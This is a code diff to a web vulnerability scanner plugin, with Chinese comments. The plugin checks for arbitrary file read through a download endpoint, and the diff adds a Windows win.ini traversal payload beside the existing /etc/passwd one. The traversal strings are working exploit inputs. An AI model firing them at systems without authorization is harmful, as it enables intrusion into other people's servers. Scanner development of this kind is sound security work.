@@ -1,11 +1,15 @@
-# 任意文件读取：通过 /common/download/resource 接口读取 /etc/passwd
+# 任意文件读取：通过 /common/download/resource 接口读取系统文件
+# （Linux 读 /etc/passwd，Windows 读 win.ini —— 双载荷，见 PAYLOADS）
+from common.logger import get_logger
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import join_url
 from lib.colors import no, ok
-from lib.matcher import match_file_read_leak
+from lib.matcher import is_windows_ini, match_file_read_leak
 from lib.reachability import login_wall_reason
 from lib.reporter import emit
 from plugins.base import PluginBase
+
+logger = get_logger(__name__)
 
 
 class FileReadPlugin(PluginBase):
@@ -43,58 +47,112 @@ class FileReadPlugin(PluginBase):
     vuln_type = "file_read"
     supports_waf_bypass = True
 
+    # 双载荷：Linux 读 /etc/passwd，Windows 读 win.ini。
+    #
+    # 为什么必须双载荷（v1.5.6 WP2）：靶场跑在 Windows 上时，读 /etc/passwd 必然
+    # 拿不到证据——但这不代表目标没有文件读取漏洞。只认 Linux 特征等于在 Windows
+    # 目标上系统性漏报（盲测 v3 的两个「任意文件读取」零产出就是这么来的）。
+    # reproduce 里早就写了 win.ini 的 curl，但判据不支持，属文档承诺了、代码没实现。
+    PAYLOADS = (
+        (
+            "/profile/../../../../../../../etc/passwd",
+            "traversal_etc_passwd",
+            "Linux（/etc/passwd）",
+        ),
+        (
+            "/profile/../../../../../../../windows/win.ini",
+            "traversal_windows_winini",
+            "Windows（win.ini）",
+        ),
+    )
+
     def verify(self, target, session):
-        """通过 /common/download/resource 路径穿越读取 /etc/passwd 验证漏洞
+        """通过 /common/download/resource 路径穿越读取系统文件验证漏洞
+
+        依次尝试 Linux 与 Windows 的载荷：任一读到真实文件特征即 CONFIRMED。
+        Windows 目标上读不到 /etc/passwd 是**正常现象**，不能据此判 SAFE。
 
         @param target: 目标主机，用于拼接下载接口地址
         @param session: 复用的 HTTP 会话对象
-        @return: ScanResult——响应含真实 /etc/passwd 行特征（root:x:0:0: 等）为 CONFIRMED，否则 SAFE
+        @return: ScanResult——响应含真实系统文件特征为 CONFIRMED，全部未命中为 SAFE
         """
-        # 原 URL 拼接：self.url + '/common/...'（self.url 以 / 结尾，保留双斜杠特性）
-        url = join_url(target, "/common/download/resource?resource=/profile/../../../../../../../etc/passwd")
-        try:
-            resp = session.get(url)
-            file_read_use = resp.text or ""
-        except Exception as e:
-            emit(no("任意文件读取（网络异常）"))
-            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
-        # 登录墙（302 -> /login / 200 登录页）：没读到文件内容 ≠ 不存在
-        _wall = login_wall_reason(resp)
-        if _wall:
+        wall_reason = ""
+        tried = []
+        last_url = ""
+        for resource, payload_class, label in self.PAYLOADS:
+            url = join_url(target, f"/common/download/resource?resource={resource}")
+            last_url = url
+            try:
+                resp = session.get(url)
+            except Exception:
+                # 单个载荷请求异常不立即判 UNKNOWN：另一个载荷仍可能成功
+                tried.append(f"{label}: 网络异常")
+                logger.debug("文件读取载荷请求失败: %s", url, exc_info=True)
+                continue
+            # 登录墙（302 -> /login / 200 登录页）：没读到文件内容 ≠ 不存在
+            _wall = login_wall_reason(resp)
+            if _wall:
+                wall_reason = _wall
+                tried.append(f"{label}: 登录墙")
+                continue
+
+            text = resp.text or ""
+            # Linux：使用 lib.matcher.match_file_read_leak（校验 root:x:0:0: 等真实 passwd 行特征）。
+            # 加固说明：原判据 match_all(text, ["root", ":/"]) 过弱——":/" 在任意含 URL 的页面都出现，
+            # "root" 更是 HTML/JS/报错页的常客，普通页面即可满足，造成确定性误报。
+            hit, evidence = False, ""
+            if "passwd" in payload_class:
+                if match_file_read_leak(text):
+                    hit, evidence = True, "响应含 /etc/passwd 真实行特征（如 root:x:0:0:）"
+            else:
+                hit, evidence = is_windows_ini(text)
+
+            if hit:
+                emit(ok("存在任意文件读取漏洞"))
+                return ScanResult(
+                    kind="vuln",
+                    name=self.name,
+                    severity=self.severity,
+                    status=STATUS_CONFIRMED,
+                    url=url,
+                    evidence=f"{evidence}（{label}）",
+                    fix=self.fix,
+                    # 结构化漏洞元数据：报告层按 vuln_type/payload_class 分类聚合统计。
+                    # payload_class 按命中平台区分，避免 Linux/Windows 两次命中被去重合并。
+                    extra={
+                        "vuln_type": "arbitrary_file_read",
+                        "payload_class": payload_class,
+                        "plugin_name": "file_read",
+                    },
+                )
+            tried.append(f"{label}: 未见文件特征")
+
+        # 任一载荷被登录墙拦截 → 本次没测到，不能判 SAFE
+        if wall_reason and len(tried) == len(self.PAYLOADS):
             emit(no("任意文件读取（登录墙拦截）"))
             return ScanResult(
                 kind="vuln",
                 name=self.name,
                 status=STATUS_UNKNOWN,
-                url=url,
-                evidence=f"请求被登录墙拦截（{_wall}），无法判定文件读取是否存在",
+                url=last_url,
+                evidence=f"请求被登录墙拦截（{wall_reason}），无法判定文件读取是否存在",
             )
-        # 强特征判定：使用 lib.matcher.match_file_read_leak（校验 root:x:0:0:、daemon:x:1:1: 等真实 passwd 行特征）。
-        # 加固说明：原判据 match_all(text, ["root", ":/"]) 过弱——":/" 在任意含 URL 的页面都出现，
-        # "root" 更是 HTML/JS/报错页的常客，普通页面即可满足，造成确定性误报。
-        if match_file_read_leak(file_read_use):
-            emit(ok("存在任意文件读取漏洞"))
+        # 全部载荷都没拿到有效响应（网络异常）→ 同样不能判 SAFE
+        if all("网络异常" in t for t in tried):
+            emit(no("任意文件读取（网络异常）"))
             return ScanResult(
                 kind="vuln",
                 name=self.name,
-                severity=self.severity,
-                status=STATUS_CONFIRMED,
-                url=url,
-                evidence="响应含 /etc/passwd 真实行特征（如 root:x:0:0:）",
-                fix=self.fix,
-                # 结构化漏洞元数据：报告层按 vuln_type/payload_class 分类聚合统计
-                extra={
-                    "vuln_type": "arbitrary_file_read",
-                    "payload_class": "traversal_etc_passwd",
-                    "plugin_name": "file_read",
-                },
+                status=STATUS_UNKNOWN,
+                url=last_url,
+                evidence="全部载荷请求失败：" + "；".join(tried),
             )
-        else:
-            emit(no("不存在任意文件读取漏洞"))
-            return ScanResult(
-                kind="vuln",
-                name=self.name,
-                status=STATUS_SAFE,
-                url=url,
-                evidence="HTTP 200 但响应未含 /etc/passwd 真实行特征（root:x:0:0: 等）",
-            )
+        emit(no("不存在任意文件读取漏洞"))
+        return ScanResult(
+            kind="vuln",
+            name=self.name,
+            status=STATUS_SAFE,
+            url=last_url,
+            evidence="已尝试 Linux(/etc/passwd) 与 Windows(win.ini) 载荷，响应均未含真实系统文件特征："
+            + "；".join(tried),
+        )
